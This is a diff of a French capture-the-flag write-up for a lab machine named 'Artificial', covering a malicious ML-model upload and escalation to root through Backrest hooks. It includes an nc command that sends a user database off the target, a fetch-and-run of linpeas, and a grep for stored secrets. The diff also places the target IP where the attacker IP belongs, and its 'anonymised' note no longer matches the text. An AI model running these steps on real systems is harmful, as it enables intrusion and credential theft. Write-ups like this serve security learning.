@@ -1,6 +1,6 @@
-# 🧠 CTF – Artificial (Writeup)
+# CTF – Artificial (Writeup)
 
-## 🎯 Contexte
+## Contexte
 
 Dans ce challenge, je fais face à une application web permettant l’upload de modèles de machine learning.  
 L’objectif est d’obtenir un accès initial à la machine cible, puis d’escalader mes privilèges jusqu’à obtenir un accès **root**.
@@ -9,17 +9,17 @@ Toutes les informations sensibles ont été volontairement anonymisées pour pub
 
 ---
 
-## 🔍 Reconnaissance
+## Reconnaissance
 
 Je commence par identifier les services exposés sur la machine cible à l’aide d’un scan réseau :
 
-    nmap -sC -sV -sS <IP>
+    nmap -sC -sV -sS 10.10.11.74
 
 Le scan révèle un service HTTP exposé ainsi qu’une interface web permettant l’upload de fichiers de type **.h5** (modèles Keras).
 
 ---
 
-## 🚪 Accès initial – Upload de modèle malveillant
+## Accès initial – Upload de modèle malveillant
 
 L’application accepte des modèles `.h5`.  
 J’exploite cette fonctionnalité en générant un modèle malveillant contenant un payload exécuté côté serveur.
@@ -32,7 +32,7 @@ Pour stabiliser le shell obtenu :
 
 ---
 
-## 🗄️ Récupération de données sensibles
+## Récupération de données sensibles
 
 En explorant le système, je découvre une base de données au format `.db` contenant des informations utilisateurs, notamment des **hashs de mots de passe**.
 
@@ -44,22 +44,22 @@ Sur ma machine attaquante :
 
 Sur la machine cible :
 
-    nc <IP_ATTAQUANT> 4445 < ./users.db
+    nc 10.10.11.74 4445 < ./users.db
 
 Une fois la base récupérée, j’identifie un utilisateur valide ainsi qu’un hash de mot de passe.
 
 ---
 
-## 🔐 Craquage du mot de passe et accès SSH
+## Craquage du mot de passe et accès SSH
 
-Je soumets le hash à un outil de cracking (CrackStation / Hashcat selon le type).  
+Je soumets le hash à un outil de cracking (Hashcat 3200).  
 Une fois le mot de passe retrouvé en clair, je peux me connecter en SSH :
 
-    ssh <user>@<IP>
+    ssh gael@10.10.11.74
 
 ---
 
-## 🔎 Énumération locale
+## Énumération locale
 
 Après connexion SSH, je poursuis l’énumération locale afin d’identifier des vecteurs d’escalade de privilèges.
 
@@ -71,13 +71,13 @@ Sur ma machine :
 
 Sur la machine cible :
 
-    curl http://<IP_ATTAQUANT>:8000/linpeas.sh -o /tmp/linpeas.sh
+    curl http://10.10.11.74:8000/linpeas.sh -o /tmp/linpeas.sh
     chmod +x /tmp/linpeas.sh
     /tmp/linpeas.sh
 
 ---
 
-## 🧩 Découverte d’un service sensible (Backrest)
+## Découverte d’un service sensible (Backrest)
 
 L’énumération révèle la présence d’un service interne nommé **Backrest**, ainsi que des fichiers de configuration associés.
 
@@ -85,13 +85,13 @@ Je recherche des secrets stockés localement :
 
     grep -RniE "passw|secret|token|apikey|aws_|restic|backrest|pgpass|credential" . 2>/dev/null | head -n 50
 
-Je découvre dans un fichier de configuration (ex. `config.json`) :
-- un compte administrateur (ex. `backrest_root`)
+Je découvre dans un fichier de configuration (`config.json`) :
+- un compte administrateur (`backrest_root`)
 - un mot de passe stocké sous forme chiffrée (bcrypt)
 
 ---
 
-## 🔓 Craquage du mot de passe Backrest
+## Craquage du mot de passe Backrest
 
 Le secret récupéré est encodé et chiffré.  
 Je l’extrais et le casse à l’aide de **Hashcat** (mode bcrypt – 3200).
@@ -100,12 +100,12 @@ Une fois le mot de passe récupéré, je dispose d’identifiants valides pour B
 
 ---
 
-## 🔁 Accès à Backrest via tunnel SSH
+## Accès à Backrest via tunnel SSH
 
 Le service Backrest n’est accessible que sur `localhost` de la machine cible.  
 Je mets donc en place un tunnel SSH (port forwarding local) :
 
-    ssh -L 9898:127.0.0.1:9898 <user>@<IP>
+    ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
 
 Je peux alors accéder à l’interface Backrest depuis ma machine via :
 
@@ -115,7 +115,7 @@ Je m’authentifie avec les identifiants précédemment récupérés.
 
 ---
 
-## 🚀 Escalade de privilèges via Backrest
+## Escalade de privilèges via Backrest
 
 Backrest permet de configurer des **repositories** et des **hooks** exécutés automatiquement lors de certaines actions.
 
@@ -129,7 +129,7 @@ Après déclenchement de l’action côté Backrest, le hook est exécuté et je
 
 ---
 
-## 🏁 Conclusion
+## Conclusion
 
 Ce challenge met en évidence :
 - les risques liés à l’upload de fichiers applicatifs mal contrôlés,
@@ -141,7 +141,7 @@ L’exploitation combine attaque applicative, exfiltration de données, cracking
 
 ---
 
-## 🧠 Compétences démontrées
+## Compétences démontrées
 
 - Reconnaissance réseau (Nmap)
 - Exploitation d’upload applicatif
@@ -154,6 +154,6 @@ L’exploitation combine attaque applicative, exfiltration de données, cracking
 
 ---
 
-## 📌 Notes (Redacted)
+## Notes
 
 Toutes les adresses IP, noms d’utilisateurs, chemins exacts, secrets et flags ont été volontairement anonymisés pour permettre une publication publique sur GitHub.
